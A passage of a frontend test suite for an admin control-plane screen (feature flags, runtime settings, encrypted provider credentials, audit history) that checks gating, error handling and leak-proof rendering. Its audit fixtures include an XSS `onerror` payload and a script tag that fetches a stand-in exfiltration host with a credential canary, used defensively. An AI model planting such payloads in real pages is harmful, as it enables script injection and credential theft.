import { fireEvent, screen, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { beforeEach, describe, expect, it, vi } from 'vitest';

import {
  allowGlobalPermissions,
  resetAuthClientStub,
} from '@/test/auth-client-stub';
import { renderWithProviders } from '@/test/render';

vi.mock('@/features/auth/auth-client', async () => {
  const { authClientStub } = await import('@/test/auth-client-stub');

  return { authClient: authClientStub };
});

/**
 * The API module is mocked, not `fetch`.
 *
 * `application-api` is asserted elsewhere to be the only module in the
 * application that calls `fetch`, so stubbing it is stubbing the whole network
 * boundary. What these tests are about is the operator's screen — what it
 * shows, what it lets them press, and what it sends — not URL construction.
 */
const listFeatureFlags = vi.fn();
const setFeatureFlag = vi.fn();
const clearFeatureFlag = vi.fn();
const listRuntimeSettings = vi.fn();
const setRuntimeSetting = vi.fn();
const resetRuntimeSetting = vi.fn();
const listManagedSecrets = vi.fn();
const setManagedSecret = vi.fn();
const removeManagedSecret = vi.fn();
const listControlPlaneAudit = vi.fn();

vi.mock('@/lib/application-api', async () => {
  const actual = await vi.importActual<typeof import('@/lib/application-api')>(
    '@/lib/application-api',
  );

  return {
    ...actual,
    listFeatureFlags: (...args: unknown[]) => listFeatureFlags(...args),
    setFeatureFlag: (...args: unknown[]) => setFeatureFlag(...args),
    clearFeatureFlag: (...args: unknown[]) => clearFeatureFlag(...args),
    listRuntimeSettings: (...args: unknown[]) => listRuntimeSettings(...args),
    setRuntimeSetting: (...args: unknown[]) => setRuntimeSetting(...args),
    resetRuntimeSetting: (...args: unknown[]) => resetRuntimeSetting(...args),
    listManagedSecrets: (...args: unknown[]) => listManagedSecrets(...args),
    setManagedSecret: (...args: unknown[]) => setManagedSecret(...args),
    removeManagedSecret: (...args: unknown[]) => removeManagedSecret(...args),
    listControlPlaneAudit: (...args: unknown[]) => listControlPlaneAudit(...args),
  };
});

const { ControlPlaneBlock } = await import('./control-plane-block');
const { ApiError, ApiUnavailableError } = await import(
  '@/lib/application-api',
);

const flag = (overrides: Record<string, unknown> = {}) => ({
  key: 'agents.enabled',
  description: 'Whether agent runs may be accepted.',
  enabled: false,
  source: 'default' as const,
  defaultEnabled: false,
  platformOverride: undefined,
  organizationOverride: undefined,
  organizationOverridable: true,
  ...overrides,
});

const setting = (overrides: Record<string, unknown> = {}) => ({
  key: 'knowledge.retrieval_max_chunks',
  description: 'How many chunks retrieval may return.',
  value: 12,
  isDefault: true,
  storedValueRejected: false,
  defaultValue: 12,
  sensitivity: 'public',
  editable: true,
  updatedAt: undefined,
  ...overrides,
});

const secret = (overrides: Record<string, unknown> = {}) => ({
  key: 'openai.api_key',
  description: 'OpenAI API key.',
  configured: false,
  label: undefined,
  algorithm: undefined,
  lastRotatedAt: undefined,
  updatedAt: undefined,
  usable: false,
  ...overrides,
});

/**
 * `userEvent`, not `fireEvent`. Radix tabs activate on focus by default, and a
 * bare click event never moves focus — so a `fireEvent.click` leaves the tab
 * inactive and the test asserts against a panel that was never shown.
 */
const openTab = async (name: RegExp) =>
  userEvent.click(await screen.findByRole('tab', { name }));

beforeEach(() => {
  resetAuthClientStub();
  vi.clearAllMocks();

  listFeatureFlags.mockResolvedValue([flag()]);
  listRuntimeSettings.mockResolvedValue([setting()]);
  listManagedSecrets.mockResolvedValue([secret()]);
  listControlPlaneAudit.mockResolvedValue({
    items: [
      {
        id: 'audit_1',
        occurredAt: '2026-08-24T12:00:00.000Z',
        actorUserId: 'user_1',
        resource: 'featureFlag',
        action: 'featureFlag.setPlatformOverride',
        resourceKey: 'agents.enabled',
        organizationId: null,
        before: null,
        after: { kind: 'featureFlagOverride', enabled: true },
      },
    ],
    nextCursor: null,
  });
});

/**
 * A listing that fails.
 *
 * Everything else in this file starts from a panel that loaded, and the
 * failure path is the one an operator hits when the deployment is already in
 * trouble — an unreachable API, an expired session. Without these, the whole
 * error card can be deleted and the suite stays green while the operator gets
 * a blank panel with no explanation and nothing to press.
 */
describe('a listing that fails', () => {
  it('says the API could not be reached, distinctly from a refusal', async () => {
    allowGlobalPermissions('controlPlane:read');
    listFeatureFlags.mockRejectedValue(
      new ApiUnavailableError(new TypeError('Failed to fetch')),
    );

    renderWithProviders(<ControlPlaneBlock />);

    await screen.findByText(/could not be reached/i);
    expect(screen.queryByText(/something went wrong/i)).not.toBeInTheDocument();
  });

  it('says the reader was refused when the server refused them', async () => {
    allowGlobalPermissions('controlPlane:read');
    listFeatureFlags.mockRejectedValue(new ApiError(403, 'FORBIDDEN'));

    renderWithProviders(<ControlPlaneBlock />);

    // The client gate let them through; the server is the one that decides.
    await screen.findByText(/do not have permission to use the control plane/i);
  });

  /**
   * A session that expired while the tab sat open is the ordinary way this
   * screen fails, and it is not an RBAC problem: the operator holds the role.
   * Telling them they lack permission sends them looking for something they
   * already have, and no amount of retrying fixes it.
   */
  it('tells an operator whose session expired to sign in, not that they lack a role', async () => {
    allowGlobalPermissions('controlPlane:read');
    listFeatureFlags.mockRejectedValue(new ApiError(401, 'UNAUTHORIZED'));

    renderWithProviders(<ControlPlaneBlock />);

    await screen.findByText(/session has expired/i);
    expect(
      screen.queryByText(/do not have permission to use the control plane/i),
    ).not.toBeInTheDocument();
  });

  it('asks again when the operator presses retry', async () => {
    allowGlobalPermissions('controlPlane:read');
    listFeatureFlags.mockRejectedValueOnce(new ApiError(500, 'INTERNAL'));

    renderWithProviders(<ControlPlaneBlock />);

    await screen.findByText(/something went wrong/i);
    expect(listFeatureFlags).toHaveBeenCalledTimes(1);

    listFeatureFlags.mockResolvedValue([flag()]);
    fireEvent.click(screen.getByRole('button', { name: /try again/i }));

    // A retry that only clears the message would leave a spinner forever.
    await screen.findByText('agents.enabled');
    expect(listFeatureFlags).toHaveBeenCalledTimes(2);
  });

  it('cancels the listing it abandoned', async () => {
    allowGlobalPermissions('controlPlane:read');

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');

    const [signal] = listFeatureFlags.mock.calls[0] as [AbortSignal];

    expect(signal).toBeInstanceOf(AbortSignal);
  });

  it('lets the operator dismiss a write failure', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    setFeatureFlag.mockRejectedValue(new ApiError(500, 'INTERNAL'));

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');

    fireEvent.click(screen.getByRole('button', { name: /enable/i }));
    await screen.findByText(/something went wrong/i);

    fireEvent.click(screen.getByRole('button', { name: /dismiss/i }));

    await waitFor(() =>
      expect(
        screen.queryByText(/something went wrong/i),
      ).not.toBeInTheDocument(),
    );
  });
});

describe('ControlPlaneBlock', () => {
  it('refuses a reader without control-plane read, and asks the server for nothing', async () => {
    allowGlobalPermissions('user:list');

    renderWithProviders(<ControlPlaneBlock />);

    expect(
      screen.getByText(/do not have permission to use the control plane/i),
    ).toBeInTheDocument();

    /**
     * The gate is UX, but a gated page that still issues the request would
     * make the refusal cosmetic — the reader would be told no while their
     * session was used to ask anyway.
     */
    expect(listFeatureFlags).not.toHaveBeenCalled();
    expect(listRuntimeSettings).not.toHaveBeenCalled();
    expect(listManagedSecrets).not.toHaveBeenCalled();
    expect(listControlPlaneAudit).not.toHaveBeenCalled();
  });

  it('loads only the panel that is open', async () => {
    allowGlobalPermissions('controlPlane:read');

    renderWithProviders(<ControlPlaneBlock />);

    await screen.findByText('agents.enabled');

    // The credentials listing is a request an operator reading about flags has
    // no reason to make, and it is the most sensitive of the three.
    expect(listManagedSecrets).not.toHaveBeenCalled();

    await openTab(/credentials/i);

    await waitFor(() => expect(listManagedSecrets).toHaveBeenCalled());
  });

  it('loads safe audit history only when its tab is opened', async () => {
    allowGlobalPermissions('controlPlane:read');

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');

    await openTab(/audit history/i);

    await screen.findByText(/set platform override/i);
    expect(listControlPlaneAudit).toHaveBeenCalledTimes(1);
    expect(screen.getByText('user_1')).toBeInTheDocument();
    // The client renders a closed safe projection, not arbitrary JSON.
    expect(screen.getByText(/no stored state → enabled/i)).toBeInTheDocument();
  });
});

describe('feature flags', () => {
  it('shows a read-only reader the state without letting them change it', async () => {
    allowGlobalPermissions('controlPlane:read');

    renderWithProviders(<ControlPlaneBlock />);

    await screen.findByText('agents.enabled');

    expect(screen.getByRole('button', { name: /enable/i })).toBeDisabled();
    expect(
      screen.getByRole('button', { name: /clear override/i }),
    ).toBeDisabled();
  });

  it('sends the opposite of the current state and shows what the server returns', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    setFeatureFlag.mockResolvedValue(
      flag({ enabled: true, source: 'platform', platformOverride: true }),
    );

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');

    fireEvent.click(screen.getByRole('button', { name: /enable/i }));

    await screen.findByText(/^On$/);
    expect(setFeatureFlag).toHaveBeenCalledWith('agents.enabled', true);
    expect(screen.getByText(/platform override/i)).toBeInTheDocument();
  });

  it('does not offer clearing a flag that has no override', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');

    // A writer, not a reader — so a disabled button here can only mean the
    // absence of an override, and a DELETE against nothing is not offered.
    expect(screen.getByRole('button', { name: /enable/i })).toBeEnabled();
    expect(
      screen.getByRole('button', { name: /clear override/i }),
    ).toBeDisabled();
  });

  /**
   * Clearing and pinning-to-the-default look identical today and stop being
   * identical the moment the code default changes in a release. The button is
   * therefore offered only when there is an override to remove.
   */
  it('offers clearing only when an override exists', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    listFeatureFlags.mockResolvedValue([
      flag({ enabled: true, source: 'platform', platformOverride: true }),
    ]);
    clearFeatureFlag.mockResolvedValue(flag());

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');

    const clear = screen.getByRole('button', { name: /clear override/i });
    expect(clear).toBeEnabled();

    fireEvent.click(clear);

    await screen.findByText(/code default/i);
    expect(clearFeatureFlag).toHaveBeenCalledWith('agents.enabled');
  });

  /**
   * Two rows are two resources, and a write on one must not unlock the other.
   * A single shared pending key re-enables row A the moment row B starts,
   * which invites a second write to A while A's first is still open.
   */
  it('locks only the row being written', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    listFeatureFlags.mockResolvedValue([
      flag({ key: 'a.one' }),
      flag({ key: 'b.two' }),
    ]);

    let releaseFirst: (value: unknown) => void = () => {};
    setFeatureFlag.mockImplementationOnce(
      () => new Promise((resolve) => (releaseFirst = resolve)),
    );

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('a.one');

    const [enableA, enableB] = screen.getAllByRole('button', {
      name: /enable/i,
    });

    fireEvent.click(enableA);

    await waitFor(() => expect(enableA).toBeDisabled());
    // B is untouched and must stay usable.
    expect(enableB).toBeEnabled();

    releaseFirst(flag({ key: 'a.one', enabled: true }));
  });

  it('reports a refusal without clearing the table', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    setFeatureFlag.mockRejectedValue(new ApiError(403, 'FORBIDDEN'));

    renderWithProviders(<ControlPlaneBlock />);
    await screen.findByText('agents.enabled');

    fireEvent.click(screen.getByRole('button', { name: /enable/i }));

    await screen.findByText(/do not have permission/i);
    // The rows are still valid; only the write failed.
    expect(screen.getByText('agents.enabled')).toBeInTheDocument();
  });
});

describe('runtime settings', () => {
  it('sends the typed value as a number rather than a string', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    setRuntimeSetting.mockResolvedValue(
      setting({ value: 40, isDefault: false }),
    );

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/settings/i);

    const input = await screen.findByLabelText(
      'knowledge.retrieval_max_chunks',
    );
    fireEvent.change(input, { target: { value: '40' } });
    fireEvent.click(screen.getByRole('button', { name: /^save$/i }));

    await waitFor(() =>
      expect(setRuntimeSetting).toHaveBeenCalledWith(
        'knowledge.retrieval_max_chunks',
        40,
      ),
    );
  });

  /**
   * The registry's schema is the only authority on bounds. The screen must not
   * hold a second opinion, because a client-side range that drifts from the
   * server's either refuses a legal value or accepts an illegal one.
   */
  it('lets the server reject an out-of-range value and reports its refusal', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    setRuntimeSetting.mockRejectedValue(new ApiError(422, 'VALIDATION_ERROR'));

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/settings/i);

    const input = await screen.findByLabelText(
      'knowledge.retrieval_max_chunks',
    );
    fireEvent.change(input, { target: { value: '5000' } });
    fireEvent.click(screen.getByRole('button', { name: /^save$/i }));

    await screen.findByText(/refused/i);
    expect(setRuntimeSetting).toHaveBeenCalledWith(
      'knowledge.retrieval_max_chunks',
      5000,
    );
  });

  /**
   * The backend builds these reasons deliberately, because "check the allowed
   * range" cannot say what the range is. A screen that discards them leaves
   * the operator guessing at a bound only the registry knows.
   */
  it('shows the reasons the server gave for refusing a value', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    setRuntimeSetting.mockRejectedValue(
      new ApiError(422, 'VALIDATION_ERROR', {
        issues: ['Too big: expected number to be <=100'],
      }),
    );

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/settings/i);

    const input = await screen.findByLabelText(
      'knowledge.retrieval_max_chunks',
    );
    fireEvent.change(input, { target: { value: '5000' } });
    fireEvent.click(screen.getByRole('button', { name: /^save$/i }));

    await screen.findByText(/expected number to be <=100/i);
  });

  /**
   * The value the operator has to correct is the one they typed. Snapping the
   * field back to the stored value leaves them nothing to correct, beside a
   * message about a number they can no longer see.
   */
  it('keeps a refused value in the field so it can be corrected', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    setRuntimeSetting.mockRejectedValue(new ApiError(422, 'VALIDATION_ERROR'));

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/settings/i);

    const input = await screen.findByLabelText(
      'knowledge.retrieval_max_chunks',
    );
    fireEvent.change(input, { target: { value: '5000' } });
    fireEvent.click(screen.getByRole('button', { name: /^save$/i }));

    await screen.findByText(/refused/i);
    expect(input).toHaveValue('5000');
  });

  it('drops an abandoned edit when the row is reset', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    listRuntimeSettings.mockResolvedValue([
      setting({ value: 40, isDefault: false }),
    ]);
    resetRuntimeSetting.mockResolvedValue(setting());

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/settings/i);

    const input = await screen.findByLabelText(
      'knowledge.retrieval_max_chunks',
    );
    fireEvent.change(input, { target: { value: '99' } });
    fireEvent.click(screen.getByRole('button', { name: /reset/i }));

    // Otherwise the row says "Using the default" beside an input showing 99,
    // and the next Save would write 99.
    await waitFor(() => expect(input).toHaveValue('12'));
    expect(screen.getByText(/using the default/i)).toBeInTheDocument();
  });

  /**
   * A stored row that no longer satisfies its schema is the state that needs
   * saying out loud: without it the screen shows the default beside the date
   * the operator set something else, and reset appears to do nothing.
   */
  /**
   * The server's row is the truth, including the parts it changed. A schema
   * that clamps, coerces, or normalizes would otherwise leave the field
   * showing what the operator typed while the setting held something else —
   * the one thing a control-plane screen must never do.
   */
  it('shows the value the server stored, not the one that was typed', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    setRuntimeSetting.mockResolvedValue(
      setting({ value: 100, isDefault: false }),
    );

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/settings/i);

    const input = await screen.findByLabelText(/knowledge.retrieval_max_chunks/i);
    fireEvent.change(input, { target: { value: '104' } });
    fireEvent.click(screen.getByRole('button', { name: /save/i }));

    await waitFor(() => expect(input).toHaveValue('100'));
  });

  /**
   * `Number('')` is `0`, so a blanked field would post a real zero to any
   * schema whose floor allows it — accepted silently, and nothing like what
   * clearing a field means.
   */
  it('does not turn an emptied numeric field into zero', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    setRuntimeSetting.mockResolvedValue(setting());

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/settings/i);

    const input = await screen.findByLabelText(/knowledge.retrieval_max_chunks/i);
    fireEvent.change(input, { target: { value: '' } });
    fireEvent.click(screen.getByRole('button', { name: /save/i }));

    await waitFor(() =>
      expect(setRuntimeSetting).toHaveBeenCalledWith(
        'knowledge.retrieval_max_chunks',
        '',
      ),
    );
  });

  it('keeps an abandoned edit when the reset itself is refused', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    listRuntimeSettings.mockResolvedValue([
      setting({ value: 40, isDefault: false }),
    ]);
    resetRuntimeSetting.mockRejectedValue(new ApiError(403, 'FORBIDDEN'));

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/settings/i);

    const input = await screen.findByLabelText(/knowledge.retrieval_max_chunks/i);
    fireEvent.change(input, { target: { value: '99' } });
    fireEvent.click(screen.getByRole('button', { name: /reset/i }));

    // The reset changed nothing, so discarding the operator's text as though
    // it had leaves them an error message and an empty-handed field.
    await screen.findByText(/do not have permission/i);
    expect(input).toHaveValue('99');
  });

  it('says when a stored value is being ignored, and still offers reset', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    listRuntimeSettings.mockResolvedValue([
      setting({ isDefault: true, storedValueRejected: true }),
    ]);

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/settings/i);

    await screen.findByText(/stored value refused/i);
    expect(screen.getByRole('button', { name: /reset/i })).toBeEnabled();
  });

  /**
   * `raw === 'true'` would make every other spelling `false`, which
   * `z.boolean()` accepts — so an operator switching a safety control on would
   * be told it saved while it was set to off. Anything ambiguous goes to the
   * server as typed, and the server refuses it.
   */
  it.each(['True', '1', 'yes', 'ON'])(
    'does not silently read %s as false for a boolean setting',
    async (typed) => {
      allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
      listRuntimeSettings.mockResolvedValue([
        setting({
          key: 'spec.boolean_setting',
          value: true,
          defaultValue: true,
        }),
      ]);
      setRuntimeSetting.mockRejectedValue(new ApiError(422, 'VALIDATION_ERROR'));

      renderWithProviders(<ControlPlaneBlock />);
      await openTab(/settings/i);

      const input = await screen.findByLabelText('spec.boolean_setting');
      fireEvent.change(input, { target: { value: typed } });
      fireEvent.click(screen.getByRole('button', { name: /^save$/i }));

      await waitFor(() =>
        expect(setRuntimeSetting).toHaveBeenCalledWith(
          'spec.boolean_setting',
          typed,
        ),
      );
    },
  );

  it.each([
    ['true', true],
    ['false', false],
  ])('sends %s as a boolean', async (typed, expected) => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');
    listRuntimeSettings.mockResolvedValue([
      setting({ key: 'spec.boolean_setting', value: true, defaultValue: true }),
    ]);
    setRuntimeSetting.mockResolvedValue(
      setting({ key: 'spec.boolean_setting', value: expected }),
    );

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/settings/i);

    const input = await screen.findByLabelText('spec.boolean_setting');
    fireEvent.change(input, { target: { value: typed } });
    fireEvent.click(screen.getByRole('button', { name: /^save$/i }));

    await waitFor(() =>
      expect(setRuntimeSetting).toHaveBeenCalledWith(
        'spec.boolean_setting',
        expected,
      ),
    );
  });

  it('does not offer reset for a setting that was never configured', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/settings/i);

    await screen.findByText('knowledge.retrieval_max_chunks');
    expect(screen.getByRole('button', { name: /reset/i })).toBeDisabled();
  });
});

describe('managed secrets', () => {
  it('never renders a credential, because none is ever returned', async () => {
    allowGlobalPermissions('controlPlane:read');
    listManagedSecrets.mockResolvedValue([
      {
        ...secret({ configured: true, usable: true, label: 'billing account' }),
        // Not in `ManagedSecretDescription`, and that is the point: a server
        // that started returning one must not reach the screen unnoticed.
        value: 'sk-CANARY-not-a-real-key',
      },
    ]);

    const { container } = renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    await screen.findByText('openai.api_key');

    /**
     * The fixture carries a plaintext the type has no field for, because the
     * wire can hand this screen a key the TypeScript type does not declare and
     * the assertion has to mean something. `innerHTML`, not `textContent`:
     * React mirrors a controlled input's value into the serialized DOM but not
     * into text, so a credential rendered into a field would be invisible to a
     * text probe — which is exactly where one would end up.
     */
    expect(container.innerHTML).not.toContain('sk-CANARY');
    expect(screen.getByText(/billing account/i)).toBeInTheDocument();
  });

  it('shows when a configured credential was last rotated', async () => {
    allowGlobalPermissions('controlPlane:read');
    listManagedSecrets.mockResolvedValue([
      secret({
        configured: true,
        usable: true,
        lastRotatedAt: '2026-02-02T09:30:00.000Z',
      }),
    ]);

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    await screen.findByText(/last rotated/i);
  });

  it('reports the reason the server gave for refusing a credential', async () => {
    allowGlobalPermissions('controlPlane:read', 'managedSecret:write');
    setManagedSecret.mockRejectedValue(
      new ApiError(422, 'VALIDATION_ERROR', {
        reason:
          'The value does not start with "sk-", so it is probably a different provider\'s credential.',
      }),
    );

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    const input = await screen.findByLabelText(/new value for openai/i);
    fireEvent.change(input, { target: { value: 'not-a-real-key-000000000' } });
    fireEvent.click(screen.getByRole('button', { name: /^store$/i }));

    // "Check the allowed range" is not even the right sentence here.
    await screen.findByText(/does not start with/i);
  });

  /**
   * Removing a credential is the most destructive act on this screen: the
   * ciphertext is gone and every feature depending on the provider stops until
   * someone pastes the key again. Nothing here was covered.
   */
  it('removes the credential the operator pointed at', async () => {
    allowGlobalPermissions('controlPlane:read', 'managedSecret:write');
    listManagedSecrets.mockResolvedValue([
      secret({ key: 'openai.api_key', configured: true, usable: true }),
    ]);
    removeManagedSecret.mockResolvedValue(secret({ key: 'openai.api_key' }));

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    fireEvent.click(await screen.findByRole('button', { name: /remove/i }));

    await waitFor(() =>
      expect(removeManagedSecret).toHaveBeenCalledWith('openai.api_key'),
    );
  });

  it('does not offer removing a slot that holds nothing', async () => {
    allowGlobalPermissions('controlPlane:read', 'managedSecret:write');

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    await screen.findByText('openai.api_key');

    expect(screen.getByRole('button', { name: /remove/i })).toBeDisabled();
  });

  it('sends the note the operator typed alongside the credential', async () => {
    allowGlobalPermissions('controlPlane:read', 'managedSecret:write');
    setManagedSecret.mockResolvedValue(secret({ configured: true }));

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    fireEvent.change(await screen.findByLabelText(/new value for openai/i), {
      target: { value: 'not-a-real-key-000000000' },
    });
    fireEvent.change(screen.getByLabelText(/label for openai/i), {
      target: { value: 'billing account' },
    });
    fireEvent.click(screen.getByRole('button', { name: /^store$/i }));

    // Dropped silently, the operator watches their note vanish on the next
    // listing with nothing to say why.
    await waitFor(() =>
      expect(setManagedSecret).toHaveBeenCalledWith(
        'openai.api_key',
        'not-a-real-key-000000000',
        'billing account',
      ),
    );
  });

  /**
   * The two inputs are stacked in one narrow column, the upper one masked and
   * the lower one not, so a paste that lands a row too low is silent. The note
   * is stored in plaintext and read back verbatim by anyone who can list the
   * slots, so a credential left behind in it is a credential the encryption
   * never covered — in the database, in every backup, and on the screen.
   */
  it('refuses to send a note that carries the credential, and sends nothing', async () => {
    allowGlobalPermissions('controlPlane:read', 'managedSecret:write');

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    fireEvent.change(await screen.findByLabelText(/new value for openai/i), {
      target: { value: 'not-a-real-key-000000000' },
    });
    fireEvent.change(screen.getByLabelText(/label for openai/i), {
      target: { value: 'pasted here first: not-a-real-key-000000000' },
    });
    fireEvent.click(screen.getByRole('button', { name: /^store$/i }));

    await screen.findByText(/note contains the credential/i);
    expect(setManagedSecret).not.toHaveBeenCalled();
  });

  it('requires the separate credential permission, not merely control-plane write', async () => {
    allowGlobalPermissions('controlPlane:read', 'controlPlane:write');

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    await screen.findByText('openai.api_key');

    expect(screen.getByRole('button', { name: /^store$/i })).toBeDisabled();
    expect(screen.getByLabelText(/new value for openai/i)).toBeDisabled();
  });

  /**
   * Chromium ignores `autocomplete="off"` on a password field. Getting this
   * token wrong lets the browser fill the operator's own platform password
   * into a provider slot — which would then be sealed and sent to that
   * provider — and lets a password manager capture the provider key.
   */
  it('suppresses browser autofill on the credential field', async () => {
    allowGlobalPermissions('controlPlane:read', 'managedSecret:write');

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    const input = await screen.findByLabelText(/new value for openai/i);

    expect(input).toHaveAttribute('type', 'password');
    expect(input).toHaveAttribute('autocomplete', 'new-password');
  });

  it('clears the credential field once the write returns', async () => {
    allowGlobalPermissions('controlPlane:read', 'managedSecret:write');
    setManagedSecret.mockResolvedValue(
      secret({ configured: true, usable: true }),
    );

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    const input = await screen.findByLabelText(/new value for openai/i);
    fireEvent.change(input, {
      target: { value: 'sk-fake-test-credential-0000' },
    });
    fireEvent.click(screen.getByRole('button', { name: /^store$/i }));

    await waitFor(() =>
      expect(setManagedSecret).toHaveBeenCalledWith(
        'openai.api_key',
        'sk-fake-test-credential-0000',
        undefined,
      ),
    );

    // A credential left in a controlled input survives every re-render and is
    // restored by the browser after a reload.
    await waitFor(() => expect(input).toHaveValue(''));
  });

  it('clears the credential field even when the write is refused', async () => {
    allowGlobalPermissions('controlPlane:read', 'managedSecret:write');
    setManagedSecret.mockRejectedValue(new ApiError(422, 'VALIDATION_ERROR'));

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    const input = await screen.findByLabelText(/new value for openai/i);
    fireEvent.change(input, {
      target: { value: 'sk-fake-rejected-value-0000' },
    });
    fireEvent.click(screen.getByRole('button', { name: /^store$/i }));

    await screen.findByText(/refused/i);
    // A rejected value is still a credential.
    expect(input).toHaveValue('');
  });

  /**
   * "Configured but not usable" means the row was sealed under a different
   * master key. Said here it is a re-entry; found at runtime it is an
   * unexplained provider outage.
   */
  it('distinguishes a credential that cannot be decrypted from a missing one', async () => {
    allowGlobalPermissions('controlPlane:read');
    listManagedSecrets.mockResolvedValue([
      secret({ configured: true, usable: false }),
    ]);

    renderWithProviders(<ControlPlaneBlock />);
    await openTab(/credentials/i);

    await screen.findByText(/cannot be decrypted/i);
    expect(screen.getByText(/^Configured$/)).toBeInTheDocument();
  });
});

/**
 * The audit table is the one control-plane surface fed by data the client did
 * not shape, so it is the one worth proving cannot leak.
 *
 * `before` and `after` are `unknown` on the wire, and `action` is a union the
 * server chooses from. The backend writes only safe projections today, and the
 * client is nonetheless written as if it does not: it renders a closed
 * vocabulary and never stringifies the JSON it was handed. That decision is
 * invisible in the code — `stateSummary` returning a translated string looks
 * like a formatting choice — so without a test it survives exactly until
 * somebody "improves" it into `JSON.stringify(event.before)` to show operators
 * more detail.
 *
 * ## What is projected, and what is deliberately not
 *
 * `before`, `after` and `action` are projected: nothing of their content is
 * written to the DOM, only a translated term the client chose. `actorUserId`,
 * `resourceKey`, `organizationId` and `occurredAt` *are* rendered verbatim, on
 * purpose — the first three are the identifiers an operator reads the row for
 * and a projection would make the history useless, and the fourth is the
 * machine-readable half of a `<time>` element. They are covered by their own
 * case below rather than left unstated, because "the audit table cannot render
 * arbitrary data" would be a false claim about those four. What makes them safe
 * is that they are escaped React text or attributes and the backend writes them
 * from closed sets — not that the client checks them.
 *
 * These fixtures are what a regression would leak: a recognizable credential
 * canary planted in every shape one could reach it through — an unknown `kind`,
 * a known `kind` carrying extra fields, a nested object, an array, a bare
 * string, markup, and an action this build has no copy for.
 */
describe('the audit table projects the payload it is handed', () => {
  /**
   * One string, distinctive enough that finding it anywhere in the document is
   * unambiguous, and shaped like the thing whose exposure would actually
   * matter.
   */
  const CANARY = 'sk-live-AUDITCANARY-9f3c2a71b4e8-do-not-render';

  const event = (
    id: string,
    before: unknown,
    after: unknown,
  ): Record<string, unknown> => ({
    id,
    occurredAt: '2026-08-24T12:00:00.000Z',
    actorUserId: 'user_1',
    resource: 'runtimeSetting',
    action: 'runtimeSetting.set',
    resourceKey: 'knowledge.retrieval_max_chunks',
    organizationId: null,
    before,
    after,
  });

  /**
   * Every route the canary could travel, in one page.
   *
   * Listed exhaustively rather than as one representative case because the
   * regressions differ: an unknown `kind` is what a *new backend projection*
   * looks like to an old client, extra fields on a known `kind` are what a
   * widened projection looks like, and a bare string or an array is what a bug
   * or an attacker writing straight to the column looks like.
   */
  const HOSTILE = [
    // A shape this client has never been taught, which is the case the
    // fall-through summary exists for.
    event('audit_unknown_kind', null, { kind: 'somethingNew', secret: CANARY }),
    // A known kind that grew a field. The summary must read the fields it
    // knows and ignore the rest rather than widening to whatever arrived.
    event(
      'audit_widened_known_kind',
      { kind: 'runtimeSettingValue', redacted: true, value: CANARY },
      { kind: 'runtimeSettingValue', redacted: false, value: CANARY },
    ),
    event(
      'audit_secret_slot',
      { kind: 'managedSecretSlot', configured: false },
      { kind: 'managedSecretSlot', configured: true, plaintext: CANARY },
    ),
    event(
      'audit_flag_note',
      { kind: 'featureFlagOverride', enabled: false, note: CANARY },
      { kind: 'featureFlagOverride', enabled: true, note: CANARY },
    ),
    // Nested and inside an array: a stringify would find both.
    event('audit_nested', { deep: { deeper: [{ leaked: CANARY }] } }, [CANARY]),
    // Not an object at all.
    event('audit_primitive', CANARY, 42),
    // Markup, so the assertion on `innerHTML` is about escaping too and not
    // only about the absence of a substring.
    event(
      'audit_markup',
      `<img src=x onerror="alert('${CANARY}')">`,
      `<script>fetch('https://exfil.test/${CANARY}')</script>`,
    ),
    // An `action` this build has no copy for. `t()` does not throw on a missing
